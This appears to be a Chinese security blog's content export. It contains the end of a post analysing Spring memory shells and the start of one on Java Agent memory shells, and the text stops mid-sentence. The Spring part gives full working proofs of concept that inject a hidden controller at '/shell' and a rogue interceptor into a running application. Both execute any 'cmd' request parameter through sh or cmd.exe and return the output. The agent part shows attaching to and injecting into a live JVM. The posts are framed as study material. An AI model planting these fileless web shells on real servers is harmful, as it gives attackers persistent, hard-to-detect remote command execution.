容器中，所以我们只需要获取上下文，然后通过取键值对得到—-&gt;而一个 web 程序来说，肯定会有一个 dispatchservlet 以及它创建的 ApplicationContext，还有一个ContextLoaderListener创建的 WebApplicationContext,并且在dispatchservlet 创建的过程中就已经把 RequestMappingHandlerMapping注册好，装进其 IOC 容器了\n通过 dispatchservlet的 IOC 容器获取到 RequestMappingHandlerMapping之后就是注册了映射路由了  但是请注意： Spring 2.5 开始到 Spring 3.1 之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器 ；   Spring 3.1 开始及以后一般开始使用新的  org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持@Contoller和@RequestMapping注解。\n\n针对于  RequestMappingHandlerMapping 映射器的获取和注册整理一下通过RequestMappingHandlerMapping的父类 Abstract**HandlerMethod**Mapping注册实现的伪代码：\njava// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean\n\nRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);\n\n// 2. 通过反射获得自定义 controller 中唯一的 Method 对象\n\nMethod method = (Class.forName(&quot;evilMethod&quot;).getDeclaredMethods())[0];\n\n// 3. 定义访问 controller 的 URL 地址\n\nPatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);\n\n// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\n\nRequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n\n// 5. 在内存中动态注册 controller\n\nRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\n\nr.registerMapping(info, Class.forName(&quot;恶意Controller&quot;).newInstance(), method);在其父类 Abstract**HandlerMethod**Mapping中其实还有一个方法可以用来注册路由映射–detectHandlerMethods\n逻辑为接受一个任意类型的 handler 参数，然后在 IOC 容器中找寻这个名字 bean 进行注册\t\t贴一下实现的伪代码：\njavacontext.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;恶意Controller&quot;).newInstance());\n\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);\n\njava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class);\n\nm1.setAccessible(true);\n\nm1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);针对于 DefaultAnnotationHandlerMapping 的注册映射对于 Spring 2.5 开始到 Spring 3.1  的DefaultAnnotationHandlerMapping映射注册（不会现在还有人在用吧），我们可以跟踪到它的顶级父类 AbstractUrlHandlerMapping，其中有这么一段方法\njava    protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException &#123;\n        Assert.notNull(urlPath, &quot;URL path must not be null&quot;);\n        Assert.notNull(handler, &quot;Handler object must not be null&quot;);\n        Object resolvedHandler = handler;\n\n        // Eagerly resolve handler if referencing singleton via name.\n        if (!this.lazyInitHandlers &amp;&amp; handler instanceof String) &#123;\n            String handlerName = (String) handler;\n            ApplicationContext applicationContext = obtainApplicationContext();\n            if (applicationContext.isSingleton(handlerName)) &#123;\n                resolvedHandler = applicationContext.getBean(handlerName);\n            &#125;\n        &#125;\n\n        Object mappedHandler = this.handlerMap.get(urlPath);\n        if (mappedHandler != null) &#123;\n            if (mappedHandler != resolvedHandler) &#123;\n                throw new IllegalStateException(\n                        &quot;Cannot map &quot; + getHandlerDescription(handler) + &quot; to URL path [&quot; + urlPath +\n                        &quot;]: There is already &quot; + getHandlerDescription(mappedHandler) + &quot; mapped.&quot;);\n            &#125;\n        &#125;\n        else &#123;\n            if (urlPath.equals(&quot;/&quot;)) &#123;\n                if (logger.isTraceEnabled()) &#123;\n                    logger.trace(&quot;Root mapping to &quot; + getHandlerDescription(handler));\n                &#125;\n                setRootHandler(resolvedHandler);\n            &#125;\n            else if (urlPath.equals(&quot;/*&quot;)) &#123;\n                if (logger.isTraceEnabled()) &#123;\n                    logger.trace(&quot;Default mapping to &quot; + getHandlerDescription(handler));\n                &#125;\n                setDefaultHandler(resolvedHandler);\n            &#125;\n            else &#123;\n                this.handlerMap.put(urlPath, resolvedHandler);\n                if (logger.isTraceEnabled()) &#123;\n                    logger.trace(&quot;Mapped [&quot; + urlPath + &quot;] onto &quot; + getHandlerDescription(handler));\n                &#125;\n            &#125;\n        &#125;\n    &#125;我们通过传入 URL 路由 和恶意 bean 即可实现伪代码如下：\njava// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean\ncontext.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance());\n// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean\norg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);\n// 3. 反射获得 registerHandler Method\njava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class);\nm1.setAccessible(true);\n// 4. 将 dynamicController 和 URL 注册到 handlerMap 中\nm1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);0x03 最终实现 POC这里的话我们演示能够适配版本更新的 RequestMappingHandlerMapping及其 registerMapping 方法进行注册\njavapackage com.stoocea.Controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\nimport org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;\nimport org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;\nimport org.springframework.web.servlet.mvc.method.RequestMappingInfo;\nimport org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.Scanner;\n\n@Controller\npublic class EvilController &#123;\n\n        @RequestMapping(&quot;/Evil&quot;)\n    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;\n        System.out.println(&quot;i am in&quot;);\n        //获取当前上下文环境\n        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);\n\n        //手动注册Controller\n        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例\n        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);\n        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象\n        Method method = Controller_Shell.class.getDeclaredMethod(&quot;shell&quot;, HttpServletRequest.class, HttpServletResponse.class);\n        // 3. 定义访问 controller 的 URL 地址\n        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);\n        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\n        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n        // 5. 在内存中动态注册 controller\n        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\n        r.registerMapping(info, new Controller_Shell(), method);\n\n    &#125;\n\n    public class Controller_Shell&#123;\n        public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;\n            if (request.getParameter(&quot;cmd&quot;) != null) &#123;\n                boolean isLinux = true;\n                String osTyp = System.getProperty(&quot;os.name&quot;);\n                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;\n                    isLinux = false;\n                &#125;\n                String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;\n                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n                Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);\n                String output = s.hasNext() ? s.next() : &quot;&quot;;\n                response.getWriter().write(output);\n                response.getWriter().flush();\n            &#125;\n        &#125;\n    &#125;\n&#125;这里我的版本是 tomcat8   JDK11 然后 spring 版本的是 5，可以复现\n如果师傅们出不来结果，考虑如下几个方面的环境配置springmvc 中的配置是否完整，也即是否扫描了识别了 controller，和是否配置了 springmvc 的注解引擎\nxml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;\n  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n  xmlns:context=&quot;http://www.springframework.org/schema/context&quot;\n  xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;\n  xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;\n\n\n  &lt;!--    解决中文乱码问题的一键式--&gt;\n  &lt;mvc:annotation-driven&gt;\n    &lt;mvc:message-converters register-defaults=&quot;true&quot;&gt;\n      &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;\n        &lt;property name=&quot;supportedMediaTypes&quot;&gt;\n          &lt;list&gt;\n            &lt;value&gt;text/html;charset=UTF-8&lt;/value&gt;\n            &lt;value&gt;application/json;charset=UTF-8&lt;/value&gt;\n            &lt;value&gt;text/plain;charset=UTF-8&lt;/value&gt;\n            &lt;value&gt;application/xml;charset=UTF-8&lt;/value&gt;\n          &lt;/list&gt;\n        &lt;/property&gt;\n      &lt;/bean&gt;\n    &lt;/mvc:message-converters&gt;\n  &lt;/mvc:annotation-driven&gt;\n\n\n  &lt;!--扫描含有注解的controller--&gt;\n  &lt;context:component-scan base-package=&quot;com.stoocea.Controller&quot;/&gt;\n\n  &lt;!--    静态资源过滤器--&gt;\n  &lt;mvc:default-servlet-handler /&gt;\n\n  &lt;!--    SpringMVC的注解引擎--&gt;\n  &lt;mvc:annotation-driven /&gt;\n\n  &lt;!--    添加视图解析器--&gt;\n  &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; id=&quot;internalResourceViewResolver&quot;&gt;\n    &lt;!--        前缀--&gt;\n    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt;\n    &lt;!--        后缀--&gt;\n    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;\n  &lt;/bean&gt;\n  &lt;!--    Handler--&gt;\n\n&lt;/beans&gt;web.xml 中是否准备好了 dispatchservlet 的环境准备\nxml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;\n         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;\n         version=&quot;4.0&quot;&gt;\n\n  &lt;servlet&gt;\n    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n      &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n  &lt;/servlet&gt;\n\n  &lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/&lt;/url-pattern&gt;\n  &lt;/servlet-mapping&gt;\n&lt;/web-app&gt;3 interceptor 型内存马0x01 什么是 interceptor类比 Tomcat 中的 filter，主要作用是用来拦截用户的请求并做相应的处理，通常就是实现鉴权和记录日志等作用springmvc 中要想实现 interceptor 自定义并不难，可以通过如下两个方式实现：\n\n通过实现 HandlerInterceptor 接口或者继承 HandlerInterceptor 接口的实现类（比如 HandlerInterceptorAdapter）\n通过实现WebRequestInterceptor 或者继承  WebRequestInterceptor接口的实现类\n\n现在来尝试实现一个 Interceptor，采用的方法是直接实现HandlerInterceptor接口，HandlerInterceptor接口本身就有三个方法’\n\n\npreHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。\npostHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。\nafterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。\n\n首先先写一个 interceptor\njavaimport org.springframework.web.servlet.HandlerInterceptor;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class TestInterceptor  implements HandlerInterceptor &#123;\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n        String url = request.getRequestURI();\n        PrintWriter writer = response.getWriter();\n\n        if (url.indexof(&quot;/login&quot;)&gt;=0)&#123;\n            writer.write(&quot;loginSuccess&quot;);\n            writer.flush();\n            writer.close();\n            return true;\n        &#125;\n        writer.write(&quot;LoginFirst&quot;);\n        writer.flush();\n        writer.close();\n        return false;\n\n    &#125;\n&#125;然后在 webmvc 中去注册这个 interceptor\njava    &lt;mvc:interceptors&gt;\n\n        &lt;mvc:interceptor&gt;\n\n            &lt;mvc:mapping path=&quot;/*&quot;/&gt;\n\n            &lt;bean class=&quot;com.stoocea.Interceptor.TestInterceptor&quot;/&gt;\n\n        &lt;/mvc:interceptor&gt;\n\n    &lt;/mvc:interceptors&gt;然后可以写 两个controller 实验一下\njavapackage com.stoocea.Controller;\n\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\npublic class HelloController  &#123;\n\n        @RequestMapping(&quot;/hello&quot;)\n        public String hello(Model model)&#123;\n                model.addAttribute(&quot;msg&quot;,&quot;success MVC&quot;);\n                return &quot;hello&quot;;\n\n        &#125;\n\n        @GetMapping(&quot;/login&quot;)\n        @ResponseBody\n        public String login(Model model)&#123;\n                model.addAttribute(&quot;msg&quot;,&quot;success&quot;);\n                return &quot;testlogin&quot;;\n        &#125;\n&#125;当我们访问 hello 路由时会发现直接被拦截器阻断，返回 loginfirst 字符串但如果我们访问 login 路由成功执行了 interceptor 的逻辑，但是 controller 的逻辑并没有执行，这是因为拦截器在接受到请求数据，并且执行完 handler 的逻辑之后，已经把结果写入 response 进行返回了，dispatchservlet 会假定拦截器本身已经处理完毕请求，不会再去执行后续的 controller 逻辑,所以我们之后 controller 该返回的 logintest 字符串就没出来\n0x02 interceptor 的调用流程在 interceptor 的执行内容中下一个断点然后访问 login 路由查看调用栈，会发现其实还是 filter 先执行，然后经过 dispatchservlet 之后才会被分配到执行 interceptor 的内容前面的内容就不探究了，我们到 disaptchservlet 的 dodispatch 方法走到如下图的 getHandler处然后继续跟进到 getHandler 方法的具体内容最终还是调用到了 AbstractHandlerMapping 的 getHandler 方法继续跟进到 getHandlerExecutionChain这里的逻辑是最终返回一串 HandlerChain，但是一开始进入方法的时候，HandlerChain 是为空的，我们需要从adaptedInterceptors中循环遍历获取 interceptor，add 到 chain 中，这里默认存在几个自带的 interceptor，最后才会加入我们自己写的 interceptor跟进 addInterceptor直接就调用 add 方法添加了，没有任何过滤最后直接返回刚才通过循环遍历添加的 interceptor 列表，其中就包括我们写的测试 interceptor\n返回到 dispatch 的逻辑，来到 applyPreHandle 方法，他这里就开始调用每一个 interceptor 的 preHandle 方法了直到这里就是整个 interceptor 从获取到调用 prehandle 的流程，其实做完整个 prehandle 就是直接开始调用 handle 到 controller 处理逻辑了根据刚才调用栈和流程分析不难看出，其实 spring 这一层是要优先级低于 tomcat 的，因为毕竟其核心分配器dispatchServlet也属于是 servlet，肯定要执行的比 filter整合一下大概的流程\njavaHttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller0x03 interceptor 内存马的实现流程上面的流程分析其实只是在走 interceptor 被注册完之后走的流程，也就是 interceptor 如何执行的，我们注入 interceptor 内存马就必须直到 interceptor 如何先注册到 adaptedInterceptors中既然是 Spring 型，那所有的想取到的类我们都能通过 IOC 容器去取，这里首先要明确目标，我们要找的是谁？—-&gt;根据刚才的流程分析，我们刚才添加的每一个 interceptor 都是从adaptedInterceptors属性值中取的，所以我们待会要获取的就是 adaptedInterceptors的所属对象—AbstractHandlerMapping\n1x01 获取AbstractHandlerMapping这里前提是已经了解过上面所述的 4 种获取上下文 context 的方法了，我们还学习一种新的获取的方法— 通过反射获取LiveBeansView类  的 applicationContext 来获取，当然其他四种方法也是可以的\njava//通过LiveBeansView获取WebContext\nField field=Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);\nfield.setAccessible(true);\nWebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();然后就是根据 IOC 容器得到 AbstractHandlerMapping\njava//通过IOC容器get到AbstractHandlerMapping\nAbstractHandlerMapping handlerMapping=applicationContext.getBean(&quot;requestMappingHandlerMapping&quot;, AbstractHandlerMapping.class);1x02 动态注册 interceptorjavaField field1=AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);\nfield1.setAccessible(true);\nArrayList&lt;Object&gt; adtedinterceptors =(ArrayList&lt;Object&gt;)field.get(handlerMapping);1x03 完整 POCjavaimport com.stoocea.Interceptor.TestInterceptor;\nimport org.junit.Test;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\nimport org.springframework.web.context.ContextLoader;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.servlet.handler.AbstractHandlerMapping;\n\nimport java.lang.reflect.Field;\nimport java.util.ArrayList;\n\n\n//这里是测试interceptor类型memshell的POC，恶意interceptor在interceptor包中\n@Controller\npublic class Evil2Controller &#123;\n\n\n    @GetMapping(&quot;/evil2&quot;)\n    @ResponseBody\n    public String getEvilInterceptor() throws Exception&#123;\n\n        //通过LiveBeansView获取顶级Context\n//        Field field=Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);\n//        field.setAccessible(true);\n//        WebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();\n\n        //通过ContextLoader.getCurrentWebApplicationContext() 来获取上下文\n        WebApplicationContext applicationContext = ContextLoader.getCurrentWebApplicationContext();\n\n\n        //通过IOC容器get到AbstractHandlerMapping\n        AbstractHandlerMapping handlerMapping=applicationContext.getBean(&quot;requestMappingHandlerMapping&quot;, AbstractHandlerMapping.class);\n        Field field1=AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);\n        field1.setAccessible(true);\n        ArrayList&lt;Object&gt; adtedinterceptors =(ArrayList&lt;Object&gt;)field1.get(handlerMapping);\n        TestInterceptor evilInterceptor=new TestInterceptor();\n        adtedinterceptors.add(evilInterceptor);\n        return &quot;inject sucessfully&quot;;\n    &#125;\n    \n&#125;然后是恶意 interceptor 的内容\njavapackage com.stoocea.Interceptor;\n\nimport org.springframework.web.servlet.HandlerInterceptor;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.util.Scanner;\n\npublic class TestInterceptor  implements HandlerInterceptor &#123;\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n        String url = request.getRequestURI();\n        PrintWriter writer = response.getWriter();\n\n        if (request.getParameter(&quot;cmd&quot;) != null) &#123;\n            boolean isLinux = true;\n            String osTyp = System.getProperty(&quot;os.name&quot;);\n            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;\n                isLinux = false;\n            &#125;\n            String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;\n            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n            Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);\n            String output = s.hasNext() ? s.next() : &quot;&quot;;\n            response.getWriter().write(output);\n            response.getWriter().flush();\n        &#125;\n        return true;\n\n    &#125;\n&#125;\n测试其他 4 种方式也是成功的\n","slug":"Spring型内存马分析","date":"2024-03-07T09:50:51.000Z","categories_index":"锻刀的理论学习-SpringMemshell","tags_index":"锻刀","author_index":"stoocea"},{"id":"f0a5a2fed19b5df796d3c2712e650af6","title":"JavaAgent型内存马分析","content":"1.什么是 javaAgent？Agent，意为“代理”java 是一种静态强类型的语言，在运行之前必须将其编译成.class 字节码，然后交给 JVM 去处理运行。java Agent 就是一种能够在不影响正常编译的前提下，修改 java 字节码，进行动态修改已加载或者未加载的类，属性和方法的技术平常我们见到的一些技术，比如热加载，或者 RASP 都是基于 Agent 工具实现的，它具体是怎么实现的呢？\n有两种形式一种是在 JVM 启动前就加载 premain-Agent，另一种是 JVM 启动之后加载 agentmain-Agent，这里我们可以将其功能理解为一种特殊 Interceptor  （拦截器）Premain-Agent\nagentmain-Agent\n我们可以通过两个例子来看看 agentmain-Agent 和premain-Agent 到底是如何发挥作用的\npremain-Agent首先我们必须实现premain-Agent类，也就是我们要决定 agent 处理的内容和逻辑，同时我们 jar 文件的清单（mainfest）中必须要包含 Premain-Class 属性然后我们可以在命令行使用 -javaagent 来实现启动时的加载\n具体的实现如下，创建的premain-Agent类必须要实现 premian 方法\njavapackage com.example.echoshell.agents;\n\nimport java.lang.instrument.Instrumentation;\n\npublic class Java_Agent_premain &#123;\n    public static void premain(String args, Instrumentation inst) &#123;\n        for (int i =0 ; i&lt;10 ; i++)&#123;\n            System.out.println(&quot;调用了premain-Agent！&quot;);\n        &#125;\n    &#125;\n&#125;\n然后就是写一个主类，待会运行主类的时候用以测试\njavapackage org.example;\n\npublic class Hello &#123;\n    public static void main(String[] args) &#123;\n        System.out.println(&quot;Hello world!&quot;);\n    &#125;\n&#125;之后就是将 premain-agent  类打包为 jar 包了，这里源自 drunkbaby 师傅的文章会有两种方法，一种是直接 jar 命令来进行打包，一种是用 maven 来进行，推荐使用 maven，因为我自己用 jar 命令去打没打成。。我们在 pom 文件中加上如下内容\nxml\n&lt;build&gt;\n  &lt;plugins&gt;\n    &lt;plugin&gt;\n      &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n      &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;\n      &lt;version&gt;2.6&lt;/version&gt;\n      &lt;configuration&gt;\n        &lt;descriptorRefs&gt;\n          &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;\n        &lt;/descriptorRefs&gt;\n        &lt;archive&gt;\n          &lt;manifestFile&gt;\n            src/main/resources/META-INF/MANIFEST.MF\n          &lt;/manifestFile&gt;\n        &lt;/archive&gt;\n      &lt;/configuration&gt;\n    &lt;/plugin&gt;\n  &lt;/plugins&gt;\n&lt;/build&gt;然后运行 maven 的 assembly:assembly 命令打包（该命令是自定义打包，会识别 MF 文件，package 则不会）打包成功之后呢，我们会得到如下两个 jar 包，第二个是我们需要的之后就是配置 vm-option 选项了，这里经典的坑，我也是看两位大师傅的文章才缓过来打开运行那块的 Edit Configurations 选项，然后添加一个 Application，由于 VM-option 选项在新版的 ideaUI 中被隐藏起来了，我们选择 Modify options 中的 add VM options 即可重新设置 VMoption然后这个 vm-option 的制定路径就是我们刚才生成的 jar 中的第二个，记得前面带上-javaagent参数，之后配置主类的路径即可运行主类：以上就是 Premain-Agent 的工作实例需要理解一点，我们刚才对于添加新的 application 的做法中，设置了启动主类，以及对应的 vm-option，也就是说，当我们指定运行这个 application 的时候，其实是在 vm-option 指定为我们刚才打包好的 jar 包，然后在此环境下运行 hello 主类才得到的上面的结果，而不是说直接在项目中启动主类，因为这个时候的项目其实是没有指定 agent 启动的 hello 主类的\nagentmain-Agentpremain-agent 只能在类加载前去插入，而 agentmain 可以在已经运行的 jvm 中去加载，并实现相应的修改字节码的功能\nVirtualMachine类 com.sun.tools.attach.VirtualMachine类可以实现获取 JVM 信息，内存 dump，现成 dump，类信息统计等功能该类允许我们通过给 attach 方法传入一个 JVM 的 PID，来远程连接到该 JVM 上，之后我们就可以对连接的 JVM 进行各种操作，如注入 agent下面是一些该类的主要方法\njava//允许我们传入一个JVM的PID，然后远程连接到该JVM上\nVirtualMachine.attach()\n\n//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理\nVirtualMachine.loadAgent()\n\n//获得当前所有的JVM列表\nVirtualMachine.list()\n\n//解除与特定JVM的连接\nVirtualMachine.detach()VirtualMachineDescriptor类 com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息，如何 PID，虚拟机名称等，下面是一个获取特定虚拟机的 PID 事例\njavaimport java.util.List;\nimport com.sun.tools.attach.VirtualMachine;\nimport com.sun.tools.attach.VirtualMachineDescriptor;\n\npublic class get_PID &#123;\n    public static void main(String[] args) &#123;\n        //先获取到正常运行的JVM列表\n        List&lt;VirtualMachineDescriptor&gt; list =VirtualMachine.list();\n        //然后我们循环遍历刚才获取到的JVM列表，如果它当前为get_PID,就返回其pid\n        for(VirtualMachineDescriptor vmd :list)&#123;\n            if (vmd.displayName().equals(&quot;org.example.GET_PID.get_PID&quot;))&#123;\n                System.out.println(vmd.id());\n            &#125;\n        &#125;\n    &#125;\n&#125;这里有一个坑，有些找不到 tools 这个 jar 包，所以必须得自行导入\nagentmain 注入过程详解介绍完上面两种对 JVM 信息获取和操作的类之后我们来实现一个agentmain-Agent首先写一个 Sleep_Hello 类，模拟正常运行的 JVM\njavaimport static java.lang.Thread.sleep;\npublic class Sleep_Hello &#123;\n    public static void main(String[] args) throws Exception &#123;\n        while(true)&#123;\n            System.out.println(&quot;hello world&quot;);\n            sleep(5000);\n        &#125;\n    &#125;\n&#125;然后写 agentmain-Agent 类\njavaimport java.lang.instrument.Instrumentation;\nimport static java.lang.Thread.sleep;\npublic class Agent_Main &#123;\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException &#123;\n        while (true)&#123;\n            System.out.println(&quot;调用了agentmain-Agent!&quot;);\n            sleep(3000);\n        &#125;\n    &#125;\n&#125;写完开始给 agentmain-Agent 打 jar 包做成 agent配置 agentmain.mf\njavaManifest-Version: 1.0\nAgent-Class: org.example.Agent_Main\n打包方法是一样的，maven 插件打包最后写一个 inject 类，用来将我们的 agent-main 注入目标 JVM\njavaimport java.util.List;\nimport com.sun.tools.attach.*;\n\npublic class Inject_Agent &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();\n        for (VirtualMachineDescriptor vmd : list)&#123;\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if (vmd.displayName().equals(&quot;org.example.Sleep_Hello&quot;))&#123;\n                System.out.println(&quot;正在注入&quot;);\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n\n                //加载Agent\n                virtualMachine.loadAgent(&quot;H:\\\\javasecurity\\\\agentmainlearn\\\\target\\\\agentmainlearn-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);\n\n                //断开JVM连接\n                virtualMachine.detach();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n如何进行操作？我们首先先启动 Sleep_Hello 这个程序，让他对应的 JVM 跑起来，然后运行我们的 inject_Agent 程序，把我们刚才打包好的 agent 程序注入进去。就是同时运行两个程序的事，只不过注入的时候要多注入几次，可以先尝试把现在运行的 JVM 打印出来，找到 Sleep_Hello 这个我们的目标 JVM 之后，再准确的指定，成功率高一点，我这边有一个时刻打印了两次“调用了agentmain-Agent!”就是多尝试的时候打印出的效果就是，本来打印的 hello world，后来注入程序将我们的 agent 注入进去之后就开始打印 agentmain-Agent 了，并且源程序没有结束，这个现象也是很符合我们的 mmshell 的感觉\nAgentmain-Instrumentation\n\n\n\n\n\n\n\n\n”动态修改字节码“\n这个玩意我们一开始学 agent 的时候写 premainagnet 就遇到过，只不过没有细讲它 Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。这也是为什么我们写 java agent 类的时候，premain 或者 agentmain 方法的参数除了 arg 